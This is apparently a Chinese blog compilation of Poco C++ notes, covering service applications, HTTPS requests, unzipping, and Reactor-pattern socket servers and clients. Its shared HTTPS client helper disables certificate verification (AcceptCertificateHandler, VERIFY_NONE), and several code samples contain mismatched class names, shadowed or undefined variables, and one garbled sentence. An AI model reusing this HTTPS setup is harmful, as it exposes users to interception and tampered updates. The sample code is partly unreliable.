StreamCopier::copyStream(hmacStrinputStream, hmaStrcdos); hmaStrcdos.close(); cout &lt;&lt; DigestEngine::digestToHex(hStrmac.digest()) &lt;&lt; std::endl; &#125; ※使用Poco库来搭建服务程序 服务的程序类似于一个线程池程序，每个人物都是是一个子线程运行在对应的线程池当中。线程池的程序类似于下面: 123456789101112131415161718#include &quot;Poco/Util/ServerApplication.h&quot;#include &quot;Poco/Logger.h&quot; class MyServer : public Poco::Util::ServerApplication&#123;public: MyServer(); virtual ~ MyServer(); // Poco::Util::ServerApplication overridablespublic: virtual void initialize(Poco::Util::Application &amp;self) override; virtual void uninitialize() override; virtual int main(const std::vector&lt;std::string&gt;&amp; args) override; private: void createLogDir();&#125;; 线程池管理器就是所谓的服务器主程序，主程序继承自Poco::Utils::ServerApplication 主要重写三个接口 123456//initialize是初始化接口，在初始化服务器的时候被调用，做些初始化操作virtual void initialize(Poco::Util::Application &amp;self) override;//uninitialize是清理操作，在服务器终止的时候被调用，做一些清理的操作virtual void uninitialize() override;//main是主函数主要负责对应的主程序virtual int main(const std::vector&lt;std::string&gt;&amp; args) override; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &quot;MyServer.h&quot;#include &quot;Poco/TaskManager.h&quot;#include &quot;Poco/AutoPtr.h&quot;#include &quot;Poco/ConsoleChannel.h&quot;#include &quot;Poco/FileChannel.h&quot;#include &quot;Poco/SplitterChannel.h&quot;#include &quot;Poco/FormattingChannel.h&quot;#include &quot;Poco/PatternFormatter.h&quot;#include &quot;Poco/SimpleFileChannel.h&quot; #include &lt;Shlobj.h&gt;#include &lt;Shlwapi.h&gt;#include &lt;WinBase.h&gt; void MyServer::initialize(Poco::Util::Application &amp;self)&#123; ServerApplication::initialize(self); logger().information(&quot;Service is starting up&quot;);&#125;void MyServer::uninitialize()&#123; logger().information(&quot;Service is shutting down&quot;); ServerApplication::uninitialize();&#125; int MyServer::main(const std::vector&lt;std::string&gt;&amp; args)&#123; HANDLE hMutext = CreateMutexA(NULL, TRUE, &quot; My-service-mutext&quot;); logger().information(&quot;Service is running as %s ...&quot;, config().getBool(&quot;application.runAsService&quot;, false) ? std::string(&quot;service&quot;) : std::string(&quot;command line&quot;)); Poco::TaskManager taskManager; //版本更新 taskManager.start(new UpdateTask()); //等待任务取消 waitForTerminationRequest(); taskManager.cancelAll(); //等待取消操作完成 taskManager.joinAll(); ReleaseMutex(hMutext); hMutext = INVALID_HANDLE_VALUE; return Application::EXIT_OK;&#125; 服务器中的每个人物都是一个线程类似于QT中的QRunnable Poco中的程序中的每一个人物都继承于Task类， 12345678910111213#include &quot;Poco/Task.h&quot;class MyUpdateTask : public Poco::Task&#123;public: MyUpdateTask(); virtual ~ MyUpdateTask(); // Poco::Task overridablespublic: //runTask是入口函数 virtual void runTask() override;private:&#125;; 主函数中启动服务程序的方法 12345678910111213#include &quot;MyServer.h&quot;#include &lt;iostream&gt; #ifdef _DEBUGint main()&#123; HYPYServer server; server.main(std::vector&lt;std::string&gt;()); return 0;&#125;#elsePOCO_SERVER_MAIN(HYPYServer)#endif ※使用Poco库进行Https请求访问服务器 ※https Get 请求 12345678910111213141516171819202122232425262728293031323334353637383940bool UpdateTask::fetchUpdateInfoFromHTTPServer()&#123; //请求的参数 std::string arg1 = &quot;1&quot;; std::string arg2 = &quot;2&quot;; std::string arg3 = &quot;3&quot;; //拼接对应的请求 Config config; std::string path = &quot;/api/v1/update&quot;; Poco::URI uri; uri.setScheme(config.getServerScheme()); uri.setHost(config.getServerAddr()); uri.setPort(config.getServerPort()); uri.setPath(path); uri.addQueryParameter(&quot;arg1&quot;, arg1); uri.addQueryParameter(&quot;arg2&quot;, arg2); uri.addQueryParameter(&quot;arg3&quot;, arg3); Poco::Net::HTTPSClientSession* https_session = OSUtils::CommonUtils::GetHttpsClientSession(); https_session-&gt;setPort(uri.getPort()); https_session-&gt;setHost(uri.getHost()); std::string pathAndQuery(uri.getPathAndQuery()); Poco::Net::HTTPRequest request( Poco::Net::HTTPRequest::HTTP_GET, pathAndQuery, Poco::Net::HTTPMessage::HTTP_1_1); Poco::Net::HTTPResponse response; https_session-&gt;sendRequest(request); std::istream &amp;streamIn = https_session-&gt;receiveResponse(response); std::ostringstream responseStream; Poco::StreamCopier::copyStream(streamIn, responseStream); m_responseContent = responseStream.str(); delete https_session; https_session = nullptr; return response.getStatus() == Poco::Net::HTTPResponse::HTTP_OK;&#125; ※HTTP POST下载请求 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465int MyUpdateTask::UpdateWork(std::string loginid, std::string clientid, std::string&amp; filePath)&#123; try &#123; Config config; std::string path = &quot;/api/v1/dict/download&quot;; Poco::URI uri; uri.setScheme(config.getServerScheme()); uri.setHost(config.getServerAddr()); uri.setPort(config.getServerPort()); uri.setPath(path); Poco::Net::HTTPSClientSession* https_session = OSUtils::CommonUtils::GetHttpsClientSession(); https_session-&gt;setHost(uri.getHost()); https_session-&gt;setPort(uri.getPort()); Poco::Net::HTTPRequest request( Poco::Net::HTTPRequest::HTTP_POST, uri.getPathAndQuery(), Poco::Net::HTTPMessage::HTTP_1_1); Poco::Net::HTMLForm form; form.add(&quot;loginid&quot;, loginid); form.add(&quot;clientid&quot;, clientid); form.prepareSubmit(request); form.write(https_session-&gt;sendRequest(request)); Poco::Net::HTTPResponse response; std::istream &amp;streamIn = https_session-&gt;receiveResponse(response); if (response.getStatus() != Poco::Net::HTTPResponse::HTTP_OK) &#123; delete https_session; https_session = nullptr; return 1; &#125; std::ostringstream responseStream; Poco::StreamCopier::copyStream(streamIn, responseStream); std::string resultStr = responseStream.str(); delete https_session; https_session = nullptr; Poco::JSON::Parser parser; auto root = parser.parse(resultStr); Poco::JSON::Object::Ptr objRoot = root.extract&lt;Poco::JSON::Object::Ptr&gt;(); if (!objRoot) return 2; int codeResult = objRoot-&gt;getValue&lt;int&gt;(&quot;code&quot;); if (codeResult == 200) &#123; dictFilePath = objRoot-&gt;getValue&lt;std::string&gt;(&quot;result&quot;); return 0; &#125; return codeResult; &#125; catch (...) &#123; return 1; &#125;&#125; ※https Post MultiPart请求 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int MyUpdateTask::UpdateWork(std::string loginid, std::string clientid, std::string path)&#123; try &#123; //获得对应的请求参数 Config config; std::string path = &quot;/api/v1/dict/ceshi&quot;; Poco::URI uri; uri.setScheme(config.getServerScheme()); uri.setHost(config.getServerAddr()); uri.setPort(config.getServerPort()); uri.setPath(path); //获得对应的会话客户端 Poco::Net::HTTPSClientSession* https_session = OSUtils::CommonUtils::GetHttpsClientSession(); https_session-&gt;setHost(uri.getHost()); https_session-&gt;setPort(uri.getPort()); //生成对应的请求 Poco::Net::HTTPRequest request( Poco::Net::HTTPRequest::HTTP_POST, uri.getPathAndQuery(), Poco::Net::HTTPMessage::HTTP_1_1); request.setContentType(&quot;multipart/form-data&quot;); //在表单中添加对应的参数和文件 Poco::Net::HTMLForm form; form.setEncoding(Poco::Net::HTMLForm::ENCODING_MULTIPART); form.add(&quot;loginid&quot;, loginid); form.add(&quot;clientid&quot;, clientid); form.addPart(&quot;dict&quot;, new Poco::Net::FilePartSource(path)); form.prepareSubmit(request); form.write(https_session-&gt;sendRequest(request)); Poco::Net::HTTPResponse response; std::istream &amp;streamIn = https_session-&gt;receiveResponse(response); if (response.getStatus() != Poco::Net::HTTPResponse::HTTP_OK) &#123; delete https_session; https_session = nullptr; return 1; &#125; std::ostringstream responseStream; Poco::StreamCopier::copyStream(streamIn, responseStream); std::string resultStr = responseStream.str(); delete https_session; https_session = nullptr; Poco::JSON::Parser parser; auto root = parser.parse(resultStr); Poco::JSON::Object::Ptr objRoot = root.extract&lt;Poco::JSON::Object::Ptr&gt;(); if (!objRoot) return 2; int codeResult = objRoot-&gt;getValue&lt;int&gt;(&quot;code&quot;); if(codeResult == 200) &#123; return 0; &#125; return codeResult; &#125; catch (...) &#123; return 1; &#125;&#125; ※通过URL下载文件 1234567891011121314Poco::URI uri(addrs.at(index).fileUrl);Poco::Net::HTTPSClientSession* https_session = OSUtils::CommonUtils::GetHttpsClientSession();https_session-&gt;setPort(uri.getPort());https_session-&gt;setHost(uri.getHost()); Poco::Net::HTTPRequest request( Poco::Net::HTTPRequest::HTTP_GET, uri.getPathAndQuery(), Poco::Net::HTTPMessage::HTTP_1_1);Poco::Net::HTTPResponse response;https_session-&gt;sendRequest(request);std::istream &amp;streamIn = https_session-&gt;receiveResponse(response);if (response.getStatus() == Poco::Net::HTTPResponse::HTTP_OK)&#123;&#125; ※使用到的生成https请求的客户端 1234567891011Poco::Net::HTTPSClientSession* OSUtils::CommonUtils::GetHttpsClientSession()&#123; std::string certificate_path = OSUtils::PathUtils::getCertificatePath(); SSLManager::InvalidCertificateHandlerPtr handlerPtr(new AcceptCertificateHandler(false)); Context::Ptr context = new Context(Context::TLSV1_2_CLIENT_USE, certificate_path, Poco::Net::Context::VERIFY_NONE, 9); SSLManager::instance().initializeClient(nullptr, handlerPtr, context); HTTPSClientSession *session = new HTTPSClientSession(context); session-&gt;setTimeout(5000 * 1000); int timeout_sec = session-&gt;getTimeout().seconds(); return session;&#125; ※Poco库解压缩文件 1234567ifstream instream(filepath, ios::binary);Poco::Zip::Decompress decompress(instream, fileDir);decompress.decompressAllFiles();instream.close();File zip_file(filepath);if (zip_file.exists()) zip_file.remove(); ※POCO库中文编程参考指南（11）如何使用Reactor框架？[1] ※Poco Reactor模式 SocketReactor StreamSocket[2] 使用方法 12345Poco::Observer&lt;MyEventHandler, SocketNotification&gt; obs(*this, &amp;MyEventHandler::handleMyEvent);reactor.addEventHandler(obs);Poco::Observer&lt;MyEventHandler, SocketNotification&gt; obs(*this, &amp;MyEventHandler::handleMyEvent);reactor.removeEventHandler(obs); 示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162class TCPClient : public Poco::Runnable&#123;public: TCPClient(std::string master_ip, Poco::UInt16 master_port) : master_ip_(master_ip), master_port_(master_port) &#123; connect(); register_handle(); &#125; ~TCPClient() &#123; std::cout &lt;&lt; &quot;~TCPClient()!&quot; &lt;&lt; std::endl; stop(); &#125;public: int connect() &#123; int ret = 0; Poco::Net::SocketAddress sa(master_ip_, master_port_); try &#123; socket_.connect(sa); if (socket_.impl() != NULL) &#123; if (socket_.impl()-&gt;sockfd() != POCO_INVALID_SOCKET) &#123; std::cout &lt;&lt; &quot;connect Succeed&quot; &lt;&lt; std::endl; &#125; &#125; &#125; catch (Poco::Net::ConnectionRefusedException &amp;) &#123; std::cout &lt;&lt; &quot;connect ConnectionRefusedException&quot; &lt;&lt; std::endl; ret = -1; &#125; catch (Poco::Net::InvalidSocketException &amp;) &#123; std::cout &lt;&lt; &quot;connect InvalidSocketException&quot; &lt;&lt; std::endl; ret = -1; &#125; catch (Poco::Net::NetException &amp;) &#123; std::cout &lt;&lt; &quot;connect NetException&quot; &lt;&lt; std::endl; ret = -1; &#125; catch (Poco::TimeoutException &amp;) &#123; std::cout &lt;&lt; &quot;connect time out&quot; &lt;&lt; std::endl; ret = -1; &#125; catch (Poco::IOException &amp;) &#123; std::cout &lt;&lt; &quot;connect IOException&quot; &lt;&lt; std::endl; ret = -1; &#125; return ret; &#125; void register_handle() &#123; reactor_.addEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::ReadableNotification&gt;(*this, &amp;TCPClient::onSocketReadable)); reactor_.addEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::WritableNotification&gt;(*this, &amp;TCPClient::onSocketWritable)); reactor_.addEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::ShutdownNotification&gt;(*this, &amp;TCPClient::onSocketShutdown)); reactor_.addEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::ErrorNotification&gt;(*this, &amp;TCPClient::onSocketError)); reactor_.addEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::TimeoutNotification&gt;(*this, &amp;TCPClient::onSocketTimeout)); std::string data = &quot;register_handle!&quot;; std::cout &lt;&lt; data &lt;&lt; std::endl; &#125; void unregister_handle() &#123; std::string data = &quot;unregister_handle!&quot;; std::cout &lt;&lt; data &lt;&lt; std::endl; reactor_.removeEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::ReadableNotification&gt;(*this, &amp;TCPClient::onSocketReadable)); reactor_.removeEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::WritableNotification&gt;(*this, &amp;TCPClient::onSocketWritable)); reactor_.removeEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::ShutdownNotification&gt;(*this, &amp;TCPClient::onSocketShutdown)); reactor_.removeEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::ErrorNotification&gt;(*this, &amp;TCPClient::onSocketError)); reactor_.removeEventHandler(socket_, Poco::NObserver&lt;TCPClient, Poco::Net::TimeoutNotification&gt;(*this, &amp;TCPClient::onSocketTimeout)); &#125; void stop() &#123; unregister_handle(); socket_.close(); reactor_.stop(); &#125; void run() &#123; reactor_.run(); &#125; void onSocketReadable(const Poco::AutoPtr&lt;Poco::Net::ReadableNotification&gt; &amp;pNf) &#123; std::cout &lt;&lt; &quot;ReadableNotification!&quot; &lt;&lt; std::endl; unsigned char data[1025] = &#123;0&#125;; int len = socket_.receiveBytes(data, 1024); if (len &gt; 0) &#123; std::cout &lt;&lt; &quot;receiveBytes:&quot; &lt;&lt; data &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot; onSocketReadable error&quot; &lt;&lt; std::endl; stop(); &#125; &#125; void onSocketWritable(const Poco::AutoPtr&lt;Poco::Net::WritableNotification&gt; &amp;pNf) &#123; // std::cout &lt;&lt; &quot;WritableNotification&quot; &lt;&lt; std::endl; &#125; void onSocketShutdown(const Poco::AutoPtr&lt;Poco::Net::ShutdownNotification&gt; &amp;pNf) &#123; // std::cout &lt;&lt; &quot;ShutdownNotification!&quot; &lt;&lt; std::endl; &#125; void onSocketError(const Poco::AutoPtr&lt;Poco::Net::ErrorNotification&gt; &amp;pNf) &#123; // std::cout &lt;&lt; &quot;ErrorNotification!&quot; &lt;&lt; std::endl; &#125; void onSocketTimeout(const Poco::AutoPtr&lt;Poco::Net::TimeoutNotification&gt; &amp;pNf) &#123; // std::cout &lt;&lt; &quot;TimeoutNotification!&quot; &lt;&lt; std::endl; &#125; void onIdleNotification(const Poco::AutoPtr&lt;Poco::Net::IdleNotification&gt; &amp;pNf) &#123; // std::cout &lt;&lt; &quot;IdleNotification!&quot; &lt;&lt; std::endl; &#125;private: std::string master_ip_; Poco::UInt16 master_port_; Poco::Net::StreamSocket socket_; Poco::Net::SocketReactor reactor_;&#125;;int main(int argc, char **argv)&#123; std::string server_ip = &quot;127.0.0.1&quot;; Poco::UInt16 server_port = 2001; TCPClient c(server_ip, server_port); Poco::Thread thread; thread.start(c); thread.join(); return 0;&#125; ※POCO库中文编程参考指南（11）如何使用Reactor框架？[3] ※Reactor 框架概述 POCO 中的 Reactor 框架是基于 Reactor 设计模式进行设计的。其中由 Handler 将某 Socket 产生的事件，发送到指定的对象的方法上，作为回调。 ※光说不练假把式 PoechantReactorServer 类，基本与 PoechantTCPServer： 12345678910111213141516171819202122class PoechantReactorServer: public ServerApplication&#123;public: PoechantServer() &#123;&#125; //: _helpRequested(false) &#123;&#125; ~PoechantServer() &#123;&#125; protected: void initialize(Application&amp; self) &#123; loadConfiguration(); ServerApplication::initialize(self); &#125; void uninitialize() &#123; ServerApplication::uninitialize(); &#125; int main(const std::vector&lt;std::string&gt;&amp; args) &#123; // … return Application::EXIT_OK; &#125;&#125; PoechantServiceHandler 类定义如下。起重机把onReadable和onShutdown的声音带来很大的麻烦 12345678910111213141516class PoechantServiceHandler&#123;public: PoechantServiceHandler(StreamSocket&amp; socket, SocketReactor&amp; reactor)； ~PoechantServiceHandler(); void onReadable(const AutoPtr&lt;ReadableNotification&gt;&amp; pNf); void onShutdown(const AutoPtr&lt;ShutdownNotification&gt;&amp; pNf);private: enum &#123; BUFFER_SIZE = 1024 &#125;; StreamSocket _socket; SocketReactor&amp; _reactor; char *_pBuffer;&#125; PoechantServiceHandler 实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243PoechantServiceHandler::PoechantServiceHandler(StreamSocket&amp; socket, SocketReactor&amp; reactor) :_socket(socket), _reactor(reactor), _pBuffer(new char[BUFFER_SIZE])&#123; Application&amp; app = Application::instance(); app.logger().information(&quot;Connection from&quot; + socket.peerAddress().toString()); _reactor.addEventHandler(_socket, NObserver&lt;PoechantServiceHandler, ReadableNotification&gt;(*this, &amp;PoechantServiceHandler::onReadable)); _reactor.addEventHandler(_socket, NObserver&lt;PoechantServiceHandler, ShutdownNotification&gt;(*this, &amp;PoechantServiceHandler::onShutdown));&#125;~PoechantServiceHandler()&#123; Application&amp; app = Application::instance(); app.logger().information(&quot;Disconnecting &quot; + _socket.peerAddress().toString()); _reactor.removeEventHandler(_socket, NObserver&lt;PoechantServiceHandler, ReadableNotification&gt;(*this, &amp;PoechantServiceHandler::onReadable)); _reactor.removeEventHandler(_socket, NObserver&lt;PoechantServiceHandler, ShutdownNotification&gt;(*this, &amp;PoechantServiceHandler::onShutdown)); delete [] _pBuffer;&#125;void onReadable(const AutoPtr&lt;ReadableNotification&gt;&amp; pNf)&#123; // Receive data from StreamSocket int n = _socket.receiveBytes(_pBuffer, BUFFER_SIZE); // Send data back the client if (n &gt; 0) _socket.sendBytes(_pBuffer, n); else delete this;&#125; // When ShutdownNotification is detected, this method will be invoked.void onShutdown(const AutoPtr&lt;ShutdownNotification&gt;&amp; pNf)&#123; delete this;&#125; 启动： 12345678910111213141516171819int main(const std::vector&lt;std::string&gt;&amp; args)&#123; unsigned short port = (unsigned short) config().getInt(&quot;PoechantReactor.port&quot;, 12345); ServerSocket serverSocket(port); SocketReactor reactor; SocketAcceptor&lt;PoechantServiceHandler&gt; acceptor(serverSocket, reactor); reactor.run(); waitForTerminationRequest(); reactor.stop(); return Application::EXIT_OK;&#125; int main(int argc, char **argv)&#123; return PoechantServer().run(argc, argv);&#125; ※Clinet 测试代码 同《POCO库中文编程参考指南（10）如何使用TCPServer框架？》中的 Client 测试用例。 ※Reactor模式以及Poco SocketReactor 源码浅析[4] ※常见的五种IO模式 服务器端编程经常需要构造高性能的IO模型，Unix下可用的IO模型有五种： 阻塞式IO 非阻塞式IO IO复用（select/poll/epoll） 信号驱动式IO（SIGIO） 异步IO（Asynchronous IO） ※同步和异步 描述的是用户线程调用IO操作相关的系统调用时，是否需要等待内核IO操作完成。 区别： 同步IO操作：需要等待内核IO操作完成。用户线程在调用系统调用时，会向内核发起IO操作的请求，内核会立即执行IO操作，只有IO操作完成时才会返回。 异步IO操作：不需要等待内核IO操作完成。用户线程调用系统调用时，向内核发起IO操作请求后，立即返回。内核接收到请求后会自行执行IO操作，当数据就绪时，直接将数据从内核缓冲区复制到用户缓冲区，并通知用户线程。 异步IO需要操作系统支持，目前有Lunix 的 AIO 和 Windows 的 IOCP 。 ※阻塞与非阻塞式IO 描述的是内核的IO操作是否需要等待数据就绪。 区别： 读 写 阻 塞IO 内核会等待直到网络数据到达并复制到应用进程的缓冲区中或者发生错误才返回，期间会挂起线程 内核会直到将用户数据复制到内核缓冲区中或者发生错误才返回，期间会挂起线程 非阻塞IO 如果有数据到达，内核将会复制到用户缓冲区并返回，如果没有数据到达，则将立即返回一个EWOULDBLOCK错误 如果内核缓冲区有空间，则将其复制到内核缓冲区，如果内核缓冲区已满，则立即返回一个EWOULDBLOCK错误 通常在实际使用中，阻塞IO会挂起用户线程，不会造成负担，但非阻塞IO需要用户去进行轮询才能保证数据及时收到，会耗费大量CPU时间。 阻塞IO流程图： 非阻塞IO流程图： ※IO复用 IO复用的关键在于使用多路分离器（select/poll/epoll）去监听 socket 是否就绪，并返回相应的事件和文件描述符。 IO多路复用模型的流程图如下图所示，使用select可以避免非阻塞IO模型中轮询等待的问题。用户首先将需要监视的socket添加到select中，当数据到达时，select被激活，select函数返回，用户线程发起read请求，读取数据并继续执行。 从流程上来看，IO 复用并没有比同步阻塞模型有更大的优势，甚至还多了添加监视socket，以及调用select函数的额外操作。但是，使用 IO 复用最大的优势是可以在一个线程内同时处理多个socket的IO请求。用户可以注册多个socket，不断地调用多路分离函数获得就绪的文件描述符，然后进行IO操作，即可达到在同一个线程内同时处理多个IO请求的目的。而在同步阻塞模型中，必须通过多线程的方式才能达到这个目的。 ※Reactor 模式 在上述的多路IO复用模型中，其实用户线程可以通过辅助线程去等待select函数的返回结果，当select函数返回时，辅助线程通过消息通知用户线程，用户现场根据消息来确定就绪的socket，然后发起读写请求。Reactor模式 的原理就与此类似，其流程图如下： 用户线程通过向 Reactor 注册事件处理器，并立即返回执行后续操作，Reactor进行调用 select 请求，并轮询其结果，当select函数返回即有可读的socket时，Reactor就通知用户线程，执行注册的事件处理器进行数据的读取、处理工作。其类图如下： Handle：Linux上的文件操作符，Windows上的句柄，在网络编程中通常是Socket。这里统称事件源。 Event Demutiplexer：多路复用器。由操作系统提供的IO多路复用机制，比如 select/epoll 。使用时用户需要将其关心的事件源注册到多路复用器上，当有事件发生时，多路复用器会从多个事件源中选出对应的事件源。 Reactor：事件管理的接口，提供对外的注册事件和注销事件的接口，内部则使用多路复用器注册和注销事件；运行时启动事件循环，当有事件进入就绪状态时，通知事件处理器，通过注册事件的回调函数处理事件。 Enevt Handler：事件处理的接口类，每个接口对应了一种类型的事件，供Reactor在相应事件发生时调用，执行相应的事件处理。 ※Poco 中的 Reactor Poco中实现了Reactor模式，并整合了Acceptor-Connetor模式的服务器。下面是Poco中Reactor包的重要的类的概述： SocketReactor：模式中的Reactor，提供了注册事件和注销事件的接口。 SocketNotifier：模式内部用于通知事件处理器的类。 SocketAcceptor：Acceptor-Connetor模式的Acceptor。 SocketConnector：Acceptor-Connetor模式的Connetor。 ParallelSocketAcceptor：多线程版的 SocketAcceptor，与单线程版唯一的区别在于构造和轮询中被声明和使用的 SocketReactor 对象的个数（缺省值等于处理器个数）。 SocketNotification：SocketReactor 生成的所有消息的基类。一共有六个派生类，分别是： ErrorNotification，IdleNotification，ReadableNotification，ShutdownNotification，TimeoutNotification，WritableNotification。 ※使用方法 ※Reactor SocketReactor 提供了注册事件和注销事件的接口，第一个参数代表了事件源，第二个参数代表了注册的事件处理器，这里使用了Poco的Observer。当某个 socket 就绪时，Observer就会接收到相应的消息，来根据不同的消息类型调用不同的回调函数进行处理。 12345678910111213void addEventHandler(const Socket&amp; socket, const Poco::AbstractObserver&amp; observer); /// Registers an event handler with the SocketReactor. /// /// Usage: /// Poco::Observer&lt;MyEventHandler, SocketNotification&gt; obs(*this, &amp;MyEventHandler::handleMyEvent); /// reactor.addEventHandler(obs);void removeEventHandler(const Socket&amp; socket, const Poco::AbstractObserver&amp; observer); /// Unregisters an event handler with the SocketReactor. /// /// Usage: /// Poco::Observer&lt;MyEventHandler, SocketNotification&gt; obs(*this, &amp;MyEventHandler::handleMyEvent); /// reactor.removeEventHandler(obs); ※SocketAcceptor 在Poco中使用了 SocketAcceptor 来监听客户端的连接，其采用了经典的Acceptor-Connetor模式，将客户端服务端解耦为三个组件，分别是：Acceptors，Connectors 和 Service Handlers。 SocketAcceptor 的工作原理：它有一个重要的模板参数 class ServiceHandler 。构造时需要传入 SocketReactor 和 ServerSocket 对象的引用，然后向 SocketReactor 对象注册传入的 ServerSocket 和对 ReadableNotification 关心的 Observer，这个 Observer 在内部会注册一个 onAccept 回调函数。 当有客户端发起连接请求时，ServerSocket 被 select 选中，Observer 接收到 ReadableNotification 消息并调用 onAccept ，然后创建一个 ServiceHandler 对象。 ServiceHandler 对象的作用就是和客户端进行通信，其在Reactor模式中对应的就是Event Handler，只不过 Poco 中使用了自己的消息机制，不需要用户自己通过多态来实现消息通知，所以用户需要做的只是实现 ServiceHandler 。 下面的代码就是开启服务器的代码，分别声明一个 ServerSocket 对象，一个 SocketReactor 对象，一个 ParallelSocketAcceptor 对象，然后调用 SocketReactor 的 run 方法就可以了，当有客户端连接时，会自动生成一个 ServerHandler 对象处理连接。 1234567Poco::Net::ServerSocket serverSocket(4569);Poco::Net::SocketReactor reactor;Poco::Net::ParallelSocketAcceptor&lt;ServerHandler, Poco::Net::SocketReactor&gt; acceptor(serverSocket, reactor);reactor.run(); ※ServiceHandler ServiceHandler 的责任是提供处理消息的回调函数，并向 SocketReactor 注册 Observer。当对应事件发生时，SocketReactor 能根据被 select 的 socket 向某个 Observer 发出特定的消息，对应的回调函数就能够执行相应的处理。 首先，设计 ServiceHandler 时，它的构造函数必须只含有 StreamSocket 和 ServiceReactor 类型的引用参数。例如： 1MyServiceHandler(const StreamSocket&amp; socket, ServiceReactor&amp; reactor) 其次，ServiceHandler 必须提供相应 SocketNotification 的 Observer 并添加回调函数，并且需要调用 SocketReactor 的 addEventHandler 方法来注册。这样就可以正常使用了Poco的Reactor模式了。 ServerHandler 示例声明： 123456789101112131415161718192021class ServerHandler : public Poco::RefCountedObject &#123;public: ServerHandler(Poco::Net::StreamSocket&amp; socket, Poco::Net::SocketReactor&amp; reactor); ~ServerHandler(); //回调函数 void OnReadable(Poco::Net::ReadableNotification* pNf); void OnWriteable(Poco::Net::WritableNotification* pNf); void OnError(Poco::Net::ErrorNotification* pNf); void OnTimeout(Poco::Net::TimeoutNotification* pNf); void OnShutdown(Poco::Net::ShutdownNotification* pNf);private: Poco::Net::StreamSocket _socket; Poco::Net::SocketReactor&amp; _reactor; Poco::Observer&lt;ServerHandler, Poco::Net::ReadableNotification&gt; _or; Poco::Observer&lt;ServerHandler, Poco::Net::WritableNotification&gt; _ow; Poco::Observer&lt;ServerHandler, Poco::Net::ErrorNotification&gt; _oe; Poco::Observer&lt;ServerHandler, Poco::Net::TimeoutNotification&gt; _ot; Poco::Observer&lt;ServerHandler, Poco::Net::ShutdownNotification&gt; _os;&#125;; 实现： 123456789101112131415161718192021222324252627282930313233343536373839ServerHandler::ServerHandler(StreamSocket &amp; socket, SocketReactor &amp; reactor) :_logger(Poco::Logger::get(&quot;ReactorServer.ServerHandler&quot;)) , _socket(socket) , _reactor(reactor) , _or(*this, &amp;ServerHandler::OnReadable) , _ow(*this, &amp;ServerHandler::OnWriteable) , _oe(*this, &amp;ServerHandler::OnError) , _ot(*this, &amp;ServerHandler::OnTimeout) , _os(*this, &amp;ServerHandler::OnShutdown)&#123; _address = socket.peerAddress().toString(); AddReactorEventHandlers(); _socket.setNoDelay(true); _socket.setBlocking(false);&#125;ServerHandler::~ServerHandler()&#123; RemoveReactorEventHandlers();&#125;void ServerHandler::AddReactorEventHandlers()&#123; _reactor.addEventHandler(_socket, _oe); _reactor.addEventHandler(_socket, _os); _reactor.addEventHandler(_socket, _or); _reactor.addEventHandler(_socket, _ow);&#125;void ServerHandler::RemoveReactorEventHandlers()&#123; _reactor.removeEventHandler(_socket, _oe); _reactor.removeEventHandler(_socket, _os); _reactor.removeEventHandler(_socket, _or); _reactor.removeEventHandler(_socket, _ow);&#125; 至此，Poco Reactor 基本的使用方法是这些了，关键在于实现 ServerHandler 并向 SocketReactor 注册，通过 SocketAcceptor 监听客户端连接，并自动生成 ServerHandler 实例。ServerHandler 中还可以根据用户自己的需求来进行扩展，比如实现读写缓冲区，解析包，心跳等等。 具体的项目移位链接：ReactorServer ※SocketReactor 核心代码解读 Reactor 模式依赖于操作系统提供的 select 操作，select 能够轮询检查多个 Socket 的状态，包括检查可读状态，可写状态以及错误信息状态。当某个 Socket 的某一个状态就绪时，select 能够将其标识符置1，使用者可以根据标识符来判断 Socket 的状态。 在 Poco 的 Net 包中，Poco::NET::Socket 封装了操作系统提供 select 方法，并声明为静态函数，以供其他类使用，其声明如下： 123456static int select( SocketList &amp; readList, SocketList &amp; writeList, SocketList &amp; exceptList, const Poco::Timespan &amp; timeout); SocketList 由 typedef std::vector&lt;Socket&gt; SocketList; 声明。readList、writeList、exceptList 分别是需要轮询状态的 Sokcet 集合。 SocketReactor 会先将通过其 addEventHandler 方法注册的 Socket 按照是否注册消息类型来构建三个集合： 123456789101112131415161718for (EventHandlerMap::iterator it = _handlers.begin(); it != _handlers.end(); ++it)&#123; if (it-&gt;second-&gt;accepts(_pReadableNotification)) &#123; readable.push_back(it-&gt;first); nSockets++; &#125; if (it-&gt;second-&gt;accepts(_pWritableNotification)) &#123; writable.push_back(it-&gt;first); nSockets++; &#125; if (it-&gt;second-&gt;accepts(_pErrorNotification)) &#123; except.push_back(it-&gt;first); nSockets++; &#125;&#125; 然后，通过 Poco::NET::Socket::select 方法将集合中准备就绪的 Socket 挑出（底层通过std::swap交换），然后向 Socket 的 Observer 发送相应通知，如果没有就绪的话就进入等待： 12345678910111213141516if (nSockets == 0)&#123; onIdle(); Thread::trySleep(_timeout.totalMilliseconds());&#125;else if (Socket::select(readable, writable, except, _timeout))&#123; onBusy(); for (Socket::SocketList::iterator it = readable.begin(); it != readable.end(); ++it) dispatch(*it, _pReadableNotification); for (Socket::SocketList::iterator it = writable.begin(); it != writable.end(); ++it) dispatch(*it, _pWritableNotification); for (Socket::SocketList::iterator it = except.begin(); it != except.end(); ++it) dispatch(*it, _pErrorNotification);&#125; ※参考文献 高性能IO模型浅析 Poco官方文档之Network Programming libevent之Reactor模式 ※开源：Poco可移植组件库配置与使用[5] ※环境配置 ※Windows 12345678910cd pocomkdir cmake-build# 进入build并编译cd cmake-buildcmake ..# 管理员身份运行# 生成libcmake --build . --config Release# 安装cmake --build . --target install 